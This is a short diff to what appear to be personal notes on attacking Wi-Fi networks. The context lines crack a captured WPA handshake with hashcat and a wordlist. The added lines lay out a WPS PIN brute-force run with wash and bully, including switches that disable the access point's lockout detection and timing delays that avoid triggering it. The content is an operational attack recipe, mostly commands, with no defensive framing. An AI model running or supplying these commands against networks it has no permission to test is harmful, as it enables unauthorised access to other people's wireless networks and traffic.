@@ -20,3 +20,22 @@ or binary https://github.com/hashcat/hashcat-utils/releases
 
 then use hashcat
 hashcat64.exe -m 2500 27372_1613440944.hccapx D:\Shared\SecLists\fav_wordlist\fav_wordlist.txt
+
+# Using wash command will start hopping through the wireless channels and will list discovered APs that support WPS
+wash -i wlan0
+
+# make sure the monitor mode is on
+# once found the AP is vulnerable to the attack, using "bully" with the following command:
+bully -b <BSSID> <interface> 
+# BSSID is the target AP's MAC Address
+# To disable lockout detection in bullyh and force it to continue the attack  but this is not recommended
+bully -b <BSSID> -L <interface>
+# -L switch is used to disable lockdown detection
+# adding the delay to prevent lock out, values of 60 seconds or more are recommended for most APs
+bully -b <BSSID> -1 <seconds> -2 <seconds> <interface>
+
+
+
+
+
+
